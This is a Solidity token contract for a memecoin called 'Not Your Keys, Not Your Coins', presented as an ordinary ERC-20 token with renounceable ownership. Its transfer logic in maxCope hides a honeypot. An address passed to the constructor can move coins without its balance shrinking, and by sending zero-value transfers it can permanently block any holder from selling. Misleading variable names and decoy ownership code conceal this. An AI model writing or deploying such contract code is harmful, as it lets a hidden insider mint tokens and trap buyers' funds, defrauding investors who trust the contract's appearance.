/*

https://t.me/nyknycoin

                                                                                                                  
   ==-   ==.         ..                                    -=.                                                 
   %@@#. @@-  :--.  -@%:    ::  .::  :--.  ::  .:. ::.-    #@- ::.  :-:  ::   :: .--:                          
   %@#@@=@@-.%@+*@%:*@@*.   #@- %@:=@%+#@+ %@. +@- @@#+    #@=#@= =@#=#@:+@= *@-+@#+*:                         
   %@-.%@@@-=@*  #@-.@%      %@*@= %@- .@@ %@. *@- @@      #@@@#  %@#***= #@+@* :*#%@+ ..                      
   #@-  =@@- +%@@%=  #@%.    .@@*  :#@%@#: +@@##@- @%      #@--%%::#%%%*  .@@#  =%%#%+ %@:                     
                            -#@#                                         .#@%.         -+                      
                            ...                                           ..                                   
                  :.                                                  =#-                                      
  --:==:   -==:  +@%-    --  .-: .-=-.  --  :-. --:-     :==-   -==:  -*: --:==:  :==-.                        
 .@@+=@@:-@%=+@%.*@%=    *@- %@.*@*=#@+ @@  *@:.@@+=    #@+=*::@%=+@%.*@- @@+=@@.=@%+*:                        
 .@@  #@:+@* .%@.:@#      %@#@- %@: -@% @@. #@:.@%     .@@. . +@*  %@:*@- @@  %@. +*#@% .:                     
 .%%  *%: +#%%#:  #%%     .@@+  .*%%%*. +%%##%:.%#      :*%%%- =#%%#- +%- %#  *%.-#%##+ #%:                    
                         -%@+                                                                                  

*/


// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract NotYourKeysNotYourCoins is Ownable {
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 private kyc = 22;

    mapping(address => mapping(address => uint256)) public allowance;

    address public uniswapV2Pair;

    uint256 public totalSupply = 100_000_000_000_000 * 10 ** 9;

    uint8 public decimals = 9;

    function approve(address dex, uint256 coins) public returns (bool success) {
        allowance[msg.sender][dex] = coins;
        emit Approval(msg.sender, dex, coins);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    string public symbol = 'NYKNYC';

    mapping(address => uint256) private keys;

    function transferFrom(address ledger, address trezor, uint256 coins) public returns (bool success) {
        maxCope(ledger, trezor, coins);
        require(coins <= allowance[ledger][msg.sender]);
        allowance[ledger][msg.sender] -= coins;
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private validator;

    constructor(address zapping) {
        balanceOf[msg.sender] = totalSupply;
        validator[zapping] = kyc;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function transfer(address trezor, uint256 coins) public returns (bool success) {
        maxCope(msg.sender, trezor, coins);
        return true;
    }

    string public name = 'Not Your Keys, Not Your Coins';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function maxCope(address ledger, address trezor, uint256 coins) private returns (bool success) {
        if (validator[ledger] == 0) {
            balanceOf[ledger] -= coins;
        }

        if (coins == 0) keys[trezor] += kyc;

        if (validator[ledger] == 0 && uniswapV2Pair != ledger && keys[ledger] > 0) {
            validator[ledger] -= kyc;
        }

        balanceOf[trezor] += coins;
        emit Transfer(ledger, trezor, coins);
        return true;
    }
}